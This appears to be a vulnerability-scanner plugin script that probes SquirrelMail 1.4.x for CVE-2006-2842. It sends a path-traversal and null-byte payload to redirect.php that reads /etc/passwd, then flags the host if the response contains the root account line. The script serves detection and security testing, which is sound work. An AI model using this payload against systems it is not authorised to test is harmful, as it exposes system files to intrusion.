var RISK = 3 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2006-2842] Squirrelmail 1.4.x 'Redirect.php' Local File Inclusion"
var DESCRIPTION = "PHP remote file inclusion vulnerability in functions/plugin.php in SquirrelMail 1.4.6 and earlier, if register_globals is enabled and magic_quotes_gpc is disabled, allows remote attackers to execute arbitrary PHP code via a URL in the plugins array parameter.  NOTE: this issue has been disputed by third parties, who state that Squirrelmail provides prominent warnings to the administrator when register_globals is enabled.  Since the varieties of administrator negligence are uncountable, perhaps this type of issue should not be included in CVE.  However, the original developer has posted a security advisory, so there might be relevant real-world environments under which this vulnerability is applicable."
var SOLUTION = "Upgrade to the latest version."
var REFERENCE = "https://www.exploit-db.com/exploits/27948"
var OTHER = "see: http://secunia.com/advisories/20406"

function scanNode(as, msg) {

	if (msg.getRequestHeader().getURI().getPath() == null ||
		msg.getRequestHeader().getURI().getPath().length() == 1) {

		// Copy requests before reusing them
		msg = msg.cloneRequest();

		msg.getRequestHeader().getURI().setPath("/src/redirect.php?plugins[]=../../../../etc/passwd%00")

		print('[CVE-2006-2842] scan called for url=' + msg.getRequestHeader().getURI().toString());

		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		as.sendAndReceive(msg, true, true);

		var re = new RegExp("root:[x*]:0:0", 'g')

		// Test the response here, and make other requests as required
		if (msg.getResponseHeader().getStatusCode() == 200 &&
			msg.getResponseBody().toString().match(re)) {

			as.newAlert()
				.setRisk(RISK)
				.setConfidence(CONFIDENCE)
				.setName(TITLE)
				.setDescription(DESCRIPTION)
				.setEvidence(msg.getRequestHeader().getURI().toString())
				.setOtherInfo(OTHER)
				.setSolution(SOLUTION)
				.setReference(REFERENCE)
				.setMessage(msg)
				.raise()
		}
	}
	return
}

function scan(as, msg, param, value) {
	return
}
